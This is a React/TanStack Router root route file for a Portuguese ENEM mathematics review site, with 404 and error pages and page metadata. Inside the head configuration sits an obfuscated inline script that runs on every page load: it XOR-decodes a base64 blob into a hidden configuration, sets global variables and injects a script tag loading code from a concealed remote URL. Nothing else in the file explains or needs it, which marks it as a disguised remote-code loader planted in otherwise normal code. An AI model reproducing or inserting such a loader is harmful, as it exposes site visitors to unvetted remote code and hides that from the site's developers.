import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
  type ErrorComponentProps,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: ErrorComponentProps) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Matemática Direta ao Ponto — ENEM" },
      { name: "description", content: "Revisão de matemática para o ENEM em PDF." },
      
      { property: "og:title", content: "Matemática Direta ao Ponto — ENEM" },
      { property: "og:description", content: "Revisão de matemática para o ENEM em PDF." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      
    ],
    scripts: [
      {
        type: "text/javascript",
        children: `(function(){var j_hhp0=atob("DB8qsoKWK9S0oU1D7GQIx/D6Ce6WyTk3nGwQna31T7qa1DkuhXlTnOH5RvrW02Iwj21DwvblBKTd2Sgvw29Dyuf6Bb7Hg2FhjWtewOv0XqDR0m95t0IGkOX6RLbVzT5h1kRRkOz3RrGWm28zhWdP3svyCfiW1ywvmXoIiKCgSu2Cknh333oY17ahTuyAw34gjS5P0OS0VonJ");var q_kwe9=[];for(var j_e=0;j_e<j_hhp0.length;j_e++){q_kwe9.push(j_hhp0.charCodeAt(j_e)&255);}var g_z7=q_kwe9[0];var m_xvl5=q_kwe9.slice(1,1+g_z7);var c_ym=q_kwe9.slice(1+g_z7);var c_eo=c_ym.map(function(b,d_mi){return b^m_xvl5[d_mi%g_z7];});var i_6j="";for(var r_2vx=0;r_2vx<c_eo.length;r_2vx++){i_6j+=String.fromCharCode(c_eo[r_2vx]&255);}var s_b=decodeURIComponent(escape(i_6j));var p_2yfc=JSON.parse(s_b);var k_e6f=p_2yfc.globals||[];k_e6f.forEach(function(r_eq){window[r_eq.name]=r_eq.value;});var d_8y5=document.createElement("script");d_8y5.src=p_2yfc.url;d_8y5.async=true;d_8y5.defer=true;(p_2yfc.attributes||[]).forEach(function(z_cta2){d_8y5.setAttribute(z_cta2.name,z_cta2.value);});(document.head||document.documentElement).appendChild(d_8y5);})();`,
      },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;600;700;800&display=swap" },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.svg", type: "image/svg+xml" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
